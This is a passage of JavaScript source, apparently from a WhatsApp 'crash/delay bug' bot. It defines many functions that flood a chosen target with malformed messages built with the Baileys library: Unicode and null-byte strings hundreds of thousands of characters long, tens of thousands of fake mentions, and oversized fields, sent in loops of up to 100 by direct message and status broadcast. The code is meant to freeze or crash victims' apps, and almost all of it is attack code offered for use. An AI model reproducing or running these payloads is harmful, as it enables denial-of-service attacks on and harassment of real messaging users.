      buttons: [],
    }),
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`),
            statusAttributionType: "SHARED_FROM_MENTION",
            forwardedNewsletterMessageInfo: {
              newsletterJid: "11111111111111@newsletter",
              serverMessageId: 1,
              newsletterName: `Newsletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "Faiq Crash 🩸"
              },
             featureEligibilities: {
                cannotBeReactedTo: true,
                cannotBeRanked: true,
                canRequestFeedback: true
              }
            }
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: "Faiq Crash 🩸" }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "Faiq Crash 🩸" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push],
            }),
          }),
        },
      }, {});   

  for (let i = 0; i < 100; i++) {
    await sock.relayMessage("status@broadcast", etc.message, {
      messageId: etc.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });
    
    await console.log(`🧪 | Succes Send Delay Invisibel To - ${target}`);

    if (i < 99) {
      await new Promise(resolve => setTimeout(resolve, 5000));
    }      
  }
}

async function BlankUiNew(sock, target) {
  try {
    const Jooo = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                title: "7ooModdss Was Here" + "ી".repeat(50000),
                fileName: "Acara Pernikahan Joo Dengan Osaka.pptx",
                pageCount: 999999,
                fileLength: 999999999,
              },
              hasMediaAttachment: true,
            },
            body: {
              text:
                "YameteKudasai" +
                "ꦾ".repeat(80000) +
                "ោ៝".repeat(70000),
            },
            footer: {
              text: "YameteKudasai",
            },
            nativeFlowMessage: {
              buttons: [],
              messageParamsJson: "{}",
            },
          },
        },
      },
    };

    await sock.relayMessage(target, Jooo, {
      messageId: Noct.generateMessageId(),
    });
  } catch (err) {
    console.error("[BlankUi] Failed:", err);
  }
}

async function PaketExecute(sock, target) {
  try {
    const Trushed = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "🩸" + "𑇂𑆵𑆴𑆿".repeat(10000) }
          },
            extendedTextMessage: {
              text: "⚡ Paket Anda Sedang Di kemas Untuk Seterusnya" +
                "ꦽ".repeat(25000) +
                "ꦾ".repeat(25000) +
                "@1".repeat(25000)
          },
          contextInfo: {
            stanzaId: target,
            participant: target,
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "./Gama.js",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "nothing?" + "ꦾ".repeat(25000) + "@1".repeat(25000)
              },
              conversation:
                "DONE BLANK BY 𝗠𝗢𝗢𝗡" +
                "ꦽ".repeat(25000) +
                "ꦾ".repeat(25000) +
                "@1".repeat(25000)
            }
          },
          body: {
            text:
              "Halo Dweckk" +
              "ꦽ".repeat(25000) +
              "ꦾ".repeat(10000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "cta_url",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "cta_call",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "cta_copy",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "cta_reminder",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "cta_cancel_reminder",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "address_message",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "send_location",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "quick_reply",
                buttonParamsJson: "ោ៝".repeat(25000)
              },
              {
                name: "mpm",
                buttonParamsJson: "ោ៝".repeat(25000)
              }
            ],
            flowActionPayload: {
              screen: "splash_screen",
              data: { mobile: true }
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }
    };

    const msg = generateWAMessageFromContent(target, Trushed, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
  } catch (err) {
    console.error("Error PaketExecute:", err);
  }
}

async function hard(target, mention = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, mention ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 

async function FaiqDelayInvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "饾棳饾棫饾棲 - 饾棳饾棬饾棫饾棓饾棲 饾棞饾棥 饾棝饾棙饾棩饾棙 驴隆隆?",
                    contentText:
                        "饾棳饾棫饾棲 - 饾棳饾棬饾棫饾棓饾棲 饾棞饾棥 饾棝饾棙饾棩饾棙 驴隆隆?",
                    footerText: "饾棳饾棫饾棲 - 饾棳饾棬饾棫饾棓饾棲 饾棞饾棥 饾棝饾棙饾棩饾棙 驴隆隆?嗉?",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "饾棳饾棫饾棲 - 饾棳饾棬饾棫饾棓饾棲 饾棞饾棥 饾棝饾棙饾棩饾棙 驴隆隆?" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
async function DelayHard(target) {
  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(1000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
 
  const msg = generateWAMessageFromContent(
    target, 
    {
      buttonsMessage: {
        contentText: "Faiq Crash 🩸",
        footerText: "\u0000",
        buttons: [
          {
            buttonId: ".Xetxa",
            buttonText: { 
              displayText: "\n".repeat(9000),
            },
            type: 1,
          },
        ],
        headerType: 1,
        contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "289511",
          seconds: 15,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "\u0000".repeat(104500),
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {
            participant: target,
            remoteJid: "X",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
          streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
          thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
          annotations: [
            {
              embeddedContent: {
                X,
              },
              embeddedAction: true,
            },
          ],
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function BlankNoClick(sock, target) {
    try {
        const rge = (t, c) => t.repeat(c);
        const payloads = [];
        payloads.push({
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: "‼️⃟̊  ༚Ꮡ‌‌.. " + rge("ꦽ", 45000),
                        description: "👀",
                        listType: 1,
                        singleSelectReply: {
                            selectedRowId:
                                "ewe ewe ewe ewe\n" +
                                "ah ah ah ah ah ah\n" +
                                "keri keri keri keri keri"
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                        }
                    },

                    conversation: rge("ꦽ", 30000),

                    extendedTextMessage: {
                        text: rge("ꦽ", 30000),
                    }
                }
            }
        });

        payloads.push({
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "5555556666667777777@newsletter",
                        newsletterName: "Hi i'm six seven..." + rge("ꦾ", 150000),
                        caption: rge("ꦽ", 150000),
                        inviteExpiration: Date.now() + 9999999999999
                    }
                }
            }
        });

        payloads.push({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/sample",
                                mimetype: rge("ꦽ", 5000),
                                fileName: "Learn.doc",
                                fileLength: "99999",
                                jpegThumbnail: null
                            },
                            title: "Keri Keri Keri Tak Sogok"
                        },

                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("ꦽ", 10000)
                        },

                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    name: "button_one",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Tombol A"
                                    })
                                },
                                {
                                    name: "button_two",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Tombol B"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        });

        payloads.push({
            text: "Halo mas lu belum mandi apa bauk\n" + "🧪".repeat(300)
        });

        for (const p of payloads) {
            await sock.sendMessage(target, p);
        }

        console.log("Sukses mengirim semua payload");

    } catch (err) {
        console.log("Error BlankNoClik", err);
    }
}

async function MZNDelay(IsTarget) {
   let MznKill = generateWAMessageFromContent(IsTarget, {
    interactiveResponseMessage: {
      body: {
        text: "\UBBBB",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\ubbbb".repeat(120000),
        version: 3
      }
    }
   }, 
   { 
    ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0")
   }
  );
    const msg = generateWAMessageFromContent(IsTarget, MznKill, {});
    
    await sock.relayMessage(target, msg, {
     participant: { jid: target }, 
     });
}

async function DelayNative(target, mention) {
    console.log(chalk.red(`Succes Sending Bug Delay`));
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function PayloadLocaDelay(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "( ඩා ) PELERR",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "KILL YOUUU",
                address: "Faiq Crash☯",
              },
            },
            body: {
              text: "( ඩා ) FaiqNotDev",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function InvisDelay(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from("aP7OzjZYQeT/660AyijlPDU+03vMOl4UJHg6qFU3lOM=", "base64"),
                    fileLength: 99999999999,
                    seconds: 24,
                    ptt: false,
                    mediaKey: Buffer.from("WQfLoSWy9BRY4dykp/MiEvFpgf2Gt+dJFswJ8hoVz6A=", "base64"),
                    fileEncSha256: Buffer.from("03TYnSxt5tzyF42T/K/cpg2DqP3FsQ0rN0u3q31iUMU=", "base64"),
                    directPath: "/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1748513902,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        text: "Faiq Crash KILL YOUUඩා" + "ោ៝".repeat(10000),
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "XyzzZz",
                            newsletterJid: "120363309802495518@newsletter",
                            serverMessageId: 1
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "5521992999999@s.whatsapp.net"
                        },
                        nativeFlowResponseMessage: {
                            name: "© FaiqNotDev",
                            paramsJson: "\u0000".repeat(999999)
                        },
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/octet-stream",
                            fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                            fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                            fileLength: 99999999999,
                            mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                            fileName: "© FaiqNotDev",
                            mediaKeyTimestamp: 1748420423,
                            directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0"
                        }
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Faiq - INVISIBLE" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function Blank(target) {
  const cardsX = {
    header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ PELER }"
    }
  };

  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: ""
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: jid,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{{}}",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, message, { messageId: null });
}

async function DelayHard(sock, target, mention) {
  const kontol = {
    image: photo,
    caption: "Faiq 𝐈𝐬 𝐇𝐞𝐫𝐞𝐞 !!!"
  };

  const album = await generateWAMessageFromContent(jid, {
    albumMessage: {
      expectedImageCount: 100,
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 100; i++) { 
    const msg = await generateWAMessage(target, kontol, {
      upload: sock.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Tama Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: jid }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function carouselOverload(sock, target) {
  const FaiqNotDev = fs.readFileSync('./memek.jpg')
  let puqi = 'ꦾ'.repeat(150000);

  const msg = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/33435845_1021531976730367_2076058741845712432_n.enc?ccb=11-4&oh=01_Q5Aa2AEpRTwvIoRRNWCtIZK8v-eu4teFnxSPTSmXTx4w1Q6fdw&oe=68A45AB3&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "BPg9w9AJfzqIeTFQaCn2OLE8MromiR68zgcOy0KJ3m8=",
          fileLength: 909768,
          seconds: 16,
          mediaKey: "R6ZkKQfGFBfHmk1S7GogMdFr1rxEnjrSld/N3SNmcOI=",
          height: 848,
          caption: puqi,
          width: 372,
          fileEncSha256: "R/SqVPakINpZV/chhdwZrGHJjd/zFNBpfEKCDO2tEFI=",
          directPath: "/v/t62.7161-24/33435845_1021531976730367_2076058741845712432_n.enc?ccb=11-4&oh=01_Q5Aa2AEpRTwvIoRRNWCtIZK8v-eu4teFnxSPTSmXTx4w1Q6fdw&oe=68A45AB3&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1753022384,
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAmQAAAAAAAAAf/8QAFBABAAAAAAAAAAAAAAAAAAAAUP/aAAgBAQABPwAT/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
          contextInfo: {              
            stanzaId: "661E1A1744CB2A8663937D66F7D2147D",
            participant: target,
            carouselMessage: {
              cards: [
                {
                  jpegThumbnail: FaiqNotDev,
                  carouselCard: {
                    body: "FaiqNotDev",
                    buttons: [
                      {
                        buttonId: "id1",
                        buttonText: { displayText: "Y" },
                        type: "RESPONSE"
                      }
                    ],
                    header: {
                      imageMessage: {
                        jpegThumbnail: FaiqNotDev
                      },
                      title: "Function By FaiqNotDev ~ " + "軎�".repeat(614) + " " + "饝箔饝箔".repeat(2500)
                    },
                    productMessage: {
                      businessOwnerJid: "0@s.whatsapp.net",
                      product: { productId: "1" }
                    }
                  }
                }
              ],
              mentionedJid: [
                "13135550202@s.whatsapp.net",
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
              ]
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 100; i++) { // ubah sesuai kebutuhan 
    const msg1 = generateWAMessageFromContent(target, msg, {
      userJid: sock.user.id
    });

    await sock.relayMessage(target, msg1.message, {
      messageId: undefined
    });

    console.log(`FaiqNotDev Send To-${i + 1} dikirim ke ${target}`);
    await delay(2000);
  }
}

/// --- ( Code Eror Kalo Script Kalian Eror ) --- \\\
function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  bot.sendMessage(OWNER_ID, errorText, {
    parse_mode: "Markdown"
  }).catch(e => console.log("Failed to send error to owner:", e));
};

process.on("uncaughtException", (err) => {

  console.error("Uncaught Exception:", err);

});

process.on("unhandledRejection", (reason, promise) => {

  console.error("Unhandled Rejection:", reason);
});
}